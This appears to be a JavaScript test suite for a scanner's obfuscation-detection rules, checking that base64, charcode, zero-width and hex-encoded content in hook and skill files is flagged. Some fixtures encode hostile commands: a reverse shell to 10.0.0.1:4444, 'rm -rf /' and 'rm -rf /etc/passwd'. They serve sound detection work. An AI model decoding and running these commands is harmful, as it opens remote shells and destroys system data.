import { matchRule, mockFile, findRule, opts } from './helpers.js';
import { obfuscationRules } from '../../rules/obfuscation.js';

describe('Obfuscation Rules', () => {
  describe('OBF-001 - Base64 Encoded Commands', () => {
    const rule = findRule(obfuscationRules, 'OBF-001');

    it('should match echo base64 piped to base64 decode', () => {
      const content = 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d';
      const findings = matchRule(rule, mockFile('sh', 'hook'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0]?.ruleId).toBe('OBF-001');
    });

    it('should match atob() in markdown', () => {
      const content = 'Execute atob("aGVsbG8=") to decode the payload.';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should match Buffer.from with base64', () => {
      const content = 'const cmd = Buffer.from("cm0gLXJmIC8=", "base64").toString();';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should NOT match normal base64 usage without execution', () => {
      const content = 'The file is encoded in base64 format for transport.';
      const findings = matchRule(rule, mockFile('sh', 'hook'), content, opts);
      expect(findings).toHaveLength(0);
    });
  });

  describe('OBF-002 - JavaScript String Obfuscation', () => {
    const rule = findRule(obfuscationRules, 'OBF-002');

    it('should match String.fromCharCode', () => {
      const content = 'String.fromCharCode(72, 101, 108, 108, 111)';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should match unicode escape sequences', () => {
      const content = 'const s = "\\u0048\\u0065\\u006c\\u006c\\u006f";';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });
  });

  describe('OBF-003 - Zero-Width Characters', () => {
    const rule = findRule(obfuscationRules, 'OBF-003');

    it('should match zero-width space character', () => {
      const content = 'Hello​world';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should match zero-width non-joiner', () => {
      const content = 'normal‌text';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });
  });

  describe('OBF-007 - Hex Encoded Content', () => {
    const rule = findRule(obfuscationRules, 'OBF-007');

    it('should match long hex escape sequences', () => {
      const content = '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should NOT match short hex sequences', () => {
      const content = '\\x48\\x65';
      const findings = matchRule(rule, mockFile('md', 'skill'), content, opts);
      expect(findings).toHaveLength(0);
    });
  });
});
